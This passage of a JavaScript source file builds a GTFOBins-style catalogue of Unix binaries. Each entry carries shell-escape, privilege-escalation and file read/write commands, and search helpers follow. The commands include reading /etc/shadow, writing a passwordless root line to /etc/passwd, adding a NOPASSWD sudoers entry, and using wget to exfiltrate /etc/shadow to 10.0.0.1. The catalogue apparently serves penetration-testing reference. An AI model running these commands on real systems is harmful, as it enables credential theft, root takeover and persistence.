          description: 'Dumps content of target file through git diffing.',
          code: 'git diff /dev/null /etc/shadow',
        },
      ],
    },
  },

  sudo: {
    name: 'sudo',
    description: 'Execute a command as another user (typically superuser root).',
    functions: {
      shell: [
        {
          title: 'Interactive Root Shell',
          description: 'Launches default login root shell.',
          code: 'sudo -i\n# or\nsudo /bin/bash',
        },
      ],
      sudo: [
        {
          title: 'Direct Sudo Execution',
          description: 'Executes any binary with elevated privileges.',
          code: 'sudo su -',
        },
      ],
    },
  },

  su: {
    name: 'su',
    description: 'Change user ID or become superuser.',
    functions: {
      shell: [
        {
          title: 'Switch to Root Account',
          description: 'Switches directly to root user session.',
          code: 'su -',
        },
      ],
      sudo: [
        {
          title: 'Sudo Su Command',
          description: 'Escalates to root shell without knowing root password.',
          code: 'sudo su',
        },
      ],
    },
  },

  gdb: {
    name: 'gdb',
    description: 'The GNU Debugger for analyzing program execution.',
    functions: {
      shell: [
        {
          title: 'Interactive Shell Escape',
          description: 'Invokes /bin/sh directly within GDB session or command line.',
          code: 'gdb -nx -ex \'!sh\' -ex \'quit\'',
        },
      ],
      sudo: [
        {
          title: 'Sudo Root Shell',
          description: 'Spawns root shell under sudo gdb.',
          code: 'sudo gdb -nx -ex \'!sh\' -ex \'quit\'',
        },
      ],
      suid: [
        {
          title: 'SUID Privilege Escalation',
          description: 'Executes shell retaining SUID root execution.',
          code: './gdb -nx -ex \'!sh -p\' -ex \'quit\'',
        },
      ],
    },
  },

  strace: {
    name: 'strace',
    description: 'Trace system calls and signals of processes.',
    functions: {
      shell: [
        {
          title: 'Execute Command under Trace',
          description: 'Executes interactive shell directly via strace -o /dev/null.',
          code: 'strace -o /dev/null /bin/sh',
        },
      ],
      sudo: [
        {
          title: 'Sudo Root Shell',
          description: 'Runs root shell under sudo strace.',
          code: 'sudo strace -o /dev/null /bin/sh',
        },
      ],
      suid: [
        {
          title: 'SUID Execution',
          description: 'Runs shell with SUID permissions.',
          code: './strace -o /dev/null /bin/sh -p',
        },
      ],
    },
  },

  systemctl: {
    name: 'systemctl',
    description: 'Control the systemd system and service manager.',
    functions: {
      shell: [
        {
          title: 'Interactive Pager Shell Escape',
          description: 'Escapes to shell when viewing long service status.',
          code: 'systemctl status\n!/bin/sh',
        },
        {
          title: 'Spawn Transient Root Service',
          description: 'Executes a command directly as root via systemd-run.',
          code: 'systemd-run --pty /bin/bash',
        },
      ],
      sudo: [
        {
          title: 'Sudo Custom Service Creation',
          description: 'Creates temporary unit file executing reverse shell or chmod.',
          code: 'TF=$(mktemp /tmp/service.XXXXXX.service)\ncat <<EOF > $TF\n[Service]\nType=oneshot\nExecStart=/bin/sh -c "chmod +s /bin/bash"\n[Install]\nWantedBy=multi-user.target\nEOF\nsudo systemctl link $TF\nsudo systemctl enable --now $TF',
        },
      ],
    },
  },

  crontab: {
    name: 'crontab',
    description: 'Maintain crontab files for individual users (Vixie Cron).',
    functions: {
      shell: [
        {
          title: 'Editor Variable Shell Execution',
          description: 'Executes custom editor command upon crontab -e.',
          code: 'VISUAL=/bin/sh crontab -e',
        },
      ],
      sudo: [
        {
          title: 'Sudo Root Crontab Edit',
          description: 'Spawns root shell when executing crontab under sudo.',
          code: 'sudo VISUAL=/bin/sh crontab -e',
        },
      ],
      'file-read': [
        {
          title: 'List Current User Cron Tasks',
          description: 'Displays scheduled jobs for the current user.',
          code: 'crontab -l',
        },
      ],
    },
  },

  curl: {
    name: 'curl',
    description: 'Command line tool and library for transferring data with URLs.',
    functions: {
      'file-read': [
        {
          title: 'Local File Read via file:// URI',
          description: 'Reads local system files using file protocol.',
          code: 'curl file:///etc/shadow',
        },
      ],
      'file-write': [
        {
          title: 'Download and Write Remote File',
          description: 'Downloads payload and writes to target path.',
          code: 'curl -o /etc/cron.d/job http://10.0.0.1/job',
        },
      ],
      sudo: [
        {
          title: 'Sudo File Overwrite',
          description: 'Writes root files using elevated curl.',
          code: 'sudo curl -o /etc/passwd http://10.0.0.1/passwd',
        },
      ],
      suid: [
        {
          title: 'SUID File Read',
          description: 'Reads files through SUID curl binary.',
          code: './curl file:///etc/shadow',
        },
      ],
    },
  },

  wget: {
    name: 'wget',
    description: 'The non-interactive network downloader.',
    functions: {
      'file-read': [
        {
          title: 'Exfiltrate File Content',
          description: 'Sends local file body via HTTP POST or reads local files.',
          code: 'wget --post-file=/etc/shadow http://10.0.0.1:4444',
        },
      ],
      'file-write': [
        {
          title: 'Download and Save File',
          description: 'Writes file directly to system directories.',
          code: 'wget http://10.0.0.1/exploit -O /etc/cron.d/exploit',
        },
      ],
      sudo: [
        {
          title: 'Sudo File Overwrite',
          description: 'Overwrites sensitive files under sudo.',
          code: 'sudo wget http://10.0.0.1/passwd -O /etc/passwd',
        },
      ],
      suid: [
        {
          title: 'SUID File Write',
          description: 'Writes files preserving SUID root ownership.',
          code: './wget http://10.0.0.1/root_key -O /root/.ssh/authorized_keys',
        },
      ],
    },
  },

  tee: {
    name: 'tee',
    description: 'Read from standard input and write to standard output and files.',
    functions: {
      'file-write': [
        {
          title: 'Arbitrary File Write / Append',
          description: 'Appends data to files without requiring an interactive editor.',
          code: 'echo "evil ALL=(ALL) NOPASSWD:ALL" | tee -a /etc/sudoers',
        },
      ],
      sudo: [
        {
          title: 'Sudo Elevated File Write',
          description: 'Overwrites or appends to protected root files.',
          code: 'echo "root::0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd',
        },
      ],
      suid: [
        {
          title: 'SUID File Write',
          description: 'Writes to system files utilizing SUID tee.',
          code: 'echo "test" | ./tee -a /etc/ld.so.preload',
        },
      ],
    },
  },

  cp: {
    name: 'cp',
    description: 'Copy files and directories.',
    functions: {
      'file-write': [
        {
          title: 'Overwrite Sensitive File',
          description: 'Copies crafted file over system file e.g. /etc/passwd.',
          code: 'cp /tmp/passwd /etc/passwd',
        },
      ],
      sudo: [
        {
          title: 'Sudo File Overwrite',
          description: 'Copies files to protected locations under sudo.',
          code: 'sudo cp /bin/sh /bin/suidsh && sudo chmod +s /bin/suidsh',
        },
      ],
      suid: [
        {
          title: 'SUID File Overwrite',
          description: 'Overwrites protected configuration using SUID copy.',
          code: './cp /tmp/passwd /etc/passwd',
        },
      ],
      'file-read': [
        {
          title: 'Copy and Read',
          description: 'Copies protected file to readable user location.',
          code: 'cp /etc/shadow /tmp/shadow && cat /tmp/shadow',
        },
      ],
    },
  },

  mv: {
    name: 'mv',
    description: 'Move (rename) files.',
    functions: {
      'file-write': [
        {
          title: 'Replace System File',
          description: 'Moves crafted file into place of critical configuration.',
          code: 'mv /tmp/passwd /etc/passwd',
        },
      ],
      sudo: [
        {
          title: 'Sudo File Replace',
          description: 'Replaces system files with root authority.',
          code: 'sudo mv /tmp/passwd /etc/passwd',
        },
      ],
      suid: [
        {
          title: 'SUID File Replace',
          description: 'Replaces protected file with SUID binary.',
          code: './mv /tmp/shadow /etc/shadow',
        },
      ],
    },
  },

  env: {
    name: 'env',
    description: 'Run a program in a modified environment.',
    functions: {
      shell: [
        {
          title: 'Interactive Shell Spawn',
          description: 'Spawns an interactive shell via env command.',
          code: 'env /bin/sh',
        },
      ],
      sudo: [
        {
          title: 'Sudo Root Shell',
          description: 'Runs elevated shell via sudo env.',
          code: 'sudo env /bin/sh',
        },
      ],
      suid: [
        {
          title: 'SUID Privilege Escalation',
          description: 'Runs shell with SUID permissions.',
          code: './env /bin/sh -p',
        },
      ],
    },
  },

  dd: {
    name: 'dd',
    description: 'Convert and copy a file.',
    functions: {
      'file-read': [
        {
          title: 'Read Arbitrary File Content',
          description: 'Reads raw blocks of protected files or disks.',
          code: 'dd if=/etc/shadow',
        },
      ],
      'file-write': [
        {
          title: 'Write Raw Data to File or Block Device',
          description: 'Writes input stream directly to system destination.',
          code: 'echo "data" | dd of=/etc/issue',
        },
      ],
      sudo: [
        {
          title: 'Sudo Disk / File Manipulation',
          description: 'Overwrites protected files under sudo.',
          code: 'echo "root::0:0:root:/root:/bin/bash" | sudo dd of=/etc/passwd',
        },
      ],
      suid: [
        {
          title: 'SUID File Overwrite',
          description: 'Overwrites protected file via SUID binary.',
          code: 'echo "root::0:0:root:/root:/bin/bash" | ./dd of=/etc/passwd',
        },
      ],
    },
  },
};

// ── Service Helpers ──────────────────────────────────────────────

/**
 * Returns filtered list of binaries with metadata and available functions.
 * @param {Object} query - { q: string, function: string }
 */
export function getGtfobinsList(query = {}) {
  const q = (query.q || query.search || '').trim().toLowerCase();
  const funcFilter = (query.function || query.category || '').trim().toLowerCase();

  const allCategories = new Set();
  const list = [];

  for (const [binName, binData] of Object.entries(gtfobinsData)) {
    const availableFunctions = Object.keys(binData.functions || {});
    availableFunctions.forEach((f) => allCategories.add(f));

    // Filter by search query (binary name or description)
    if (q) {
      const matchName = binName.toLowerCase().includes(q);
      const matchDesc = (binData.description || '').toLowerCase().includes(q);
      if (!matchName && !matchDesc) continue;
    }

    // Filter by function category
    if (funcFilter && funcFilter !== 'all') {
      if (!availableFunctions.includes(funcFilter)) continue;
    }

    list.push({
      name: binData.name,
      description: binData.description,
      functions: availableFunctions,
      functionCount: availableFunctions.length,
    });
  }

  // Sort alphabetically
  list.sort((a, b) => a.name.localeCompare(b.name));

  return {
    total: Object.keys(gtfobinsData).length,
    filtered: list.length,
    categories: Array.from(allCategories).sort(),
    binaries: list,
  };
}

/**
 * Returns full details for a specific binary.
 * @param {string} binaryName
 */
export function getGtfobinsBinaryDetails(binaryName) {
  if (!binaryName) return null;
  const key = binaryName.trim().toLowerCase();
  return gtfobinsData[key] || null;
}
